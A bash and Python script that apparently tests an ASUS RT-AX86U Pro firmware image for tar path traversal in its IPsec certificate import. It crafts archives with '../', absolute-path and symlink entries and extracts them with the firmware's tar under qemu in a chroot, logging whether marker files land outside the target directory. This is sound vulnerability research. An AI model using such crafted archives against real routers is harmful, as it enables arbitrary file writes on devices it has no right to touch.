#!/usr/bin/env bash
set -euo pipefail

SRC=${SRC:-/root/inout/firmware/unpacked/asus/RT-AX86U_PRO_300610237436/_RT-AX86U_PRO_3.0.0.6_102_37436-g5a1fb9f_476-gaed2e_nand_squashfs.pkgtb.extracted/squashfs-root}
BASE=${BASE:-/root/inout/work/deepdive/asus_rt_ax86u_pro_300610237436_initial_2026_06_09/ipsec_tar_traversal}
ROOT="$BASE/rootfs"

case "$BASE" in
  /root/inout/work/deepdive/asus_rt_ax86u_pro_300610237436_initial_2026_06_09/*) ;;
  *) echo "Refusing unexpected BASE=$BASE" >&2; exit 2 ;;
esac

rm -rf "$BASE"
mkdir -p "$ROOT"
tar -C "$SRC" \
  --exclude='*.id0' --exclude='*.id1' --exclude='*.id2' --exclude='*.nam' --exclude='*.til' --exclude='*.i64' \
  -cf - . | tar -C "$ROOT" -xf -

mkdir -p "$ROOT/tmp/server_ipsec_file" "$ROOT/usr/bin" "$ROOT/proc" "$ROOT/dev" "$ROOT/var/run" "$ROOT/jffs/ca_files"
cp /usr/bin/qemu-arm-static "$ROOT/usr/bin/qemu-arm-static"
touch "$ROOT/dev/urandom"

python3 - "$BASE" <<'PY'
import io
import os
import tarfile
import time

base = os.sys.argv[1]
payload_path = os.path.join(base, "server_ipsec_traversal.tgz")
items = {
    "asusCert.der": b"normal file\n",
    "../../tmp/asus_tar_traversal_parent": b"parent traversal\n",
    "../../../../tmp/asus_tar_traversal_deep": b"deep traversal\n",
    "/tmp/asus_tar_traversal_abs": b"absolute traversal\n",
}
with tarfile.open(payload_path, "w:gz") as tf:
    for name, data in items.items():
        ti = tarfile.TarInfo(name)
        ti.size = len(data)
        ti.mtime = int(time.time())
        ti.mode = 0o644
        tf.addfile(ti, io.BytesIO(data))
print(payload_path)

payload_path = os.path.join(base, "server_ipsec_symlink.tgz")
with tarfile.open(payload_path, "w:gz") as tf:
    link = tarfile.TarInfo("linkout")
    link.type = tarfile.SYMTYPE
    link.linkname = "/tmp"
    link.mtime = int(time.time())
    tf.addfile(link)
    data = b"symlink traversal\n"
    ti = tarfile.TarInfo("linkout/asus_tar_symlink_write")
    ti.size = len(data)
    ti.mtime = int(time.time())
    ti.mode = 0o644
    tf.addfile(ti, io.BytesIO(data))
print(payload_path)
PY

cp "$BASE/server_ipsec_traversal.tgz" "$ROOT/tmp/server_ipsec_file/server_ipsec.tgz"

set +e
env -i PATH="/bin:/sbin:/usr/bin:/usr/sbin" HOME="/" LD_LIBRARY_PATH="/lib:/usr/lib" \
  chroot "$ROOT" /usr/bin/qemu-arm-static -L / /bin/tar -xzf /tmp/server_ipsec_file/server_ipsec.tgz -C /tmp/server_ipsec_file \
  > "$BASE/tar.stdout.log" 2> "$BASE/tar.stderr.log"
tar_rc=$?
set -e

rm -rf "$ROOT/tmp/server_ipsec_file"
mkdir -p "$ROOT/tmp/server_ipsec_file"
cp "$BASE/server_ipsec_symlink.tgz" "$ROOT/tmp/server_ipsec_file/server_ipsec.tgz"

set +e
env -i PATH="/bin:/sbin:/usr/bin:/usr/sbin" HOME="/" LD_LIBRARY_PATH="/lib:/usr/lib" \
  chroot "$ROOT" /usr/bin/qemu-arm-static -L / /bin/tar -xzf /tmp/server_ipsec_file/server_ipsec.tgz -C /tmp/server_ipsec_file \
  > "$BASE/tar_symlink.stdout.log" 2> "$BASE/tar_symlink.stderr.log"
tar_symlink_rc=$?
set -e

{
  echo "### direct tar rc"
  echo "$tar_rc"
  echo
  echo "### stdout"
  cat "$BASE/tar.stdout.log" || true
  echo
  echo "### stderr"
  cat "$BASE/tar.stderr.log" || true
  echo
  echo "### marker files"
  for p in \
    "$ROOT/tmp/server_ipsec_file/asusCert.der" \
    "$ROOT/tmp/asus_tar_traversal_parent" \
    "$ROOT/tmp/asus_tar_traversal_deep" \
    "$ROOT/tmp/asus_tar_traversal_abs"; do
    if [ -e "$p" ]; then
      echo "EXISTS ${p#$ROOT}: $(cat "$p" 2>/dev/null || true)"
    else
      echo "MISSING ${p#$ROOT}"
    fi
  done
  echo
  echo "### symlink tar rc"
  echo "$tar_symlink_rc"
  echo
  echo "### symlink stdout"
  cat "$BASE/tar_symlink.stdout.log" || true
  echo
  echo "### symlink stderr"
  cat "$BASE/tar_symlink.stderr.log" || true
  echo
  echo "### symlink marker"
  if [ -e "$ROOT/tmp/asus_tar_symlink_write" ]; then
    echo "EXISTS /tmp/asus_tar_symlink_write: $(cat "$ROOT/tmp/asus_tar_symlink_write" 2>/dev/null || true)"
  else
    echo "MISSING /tmp/asus_tar_symlink_write"
  fi
} | tee "$BASE/evidence.txt"

echo "$BASE/evidence.txt"
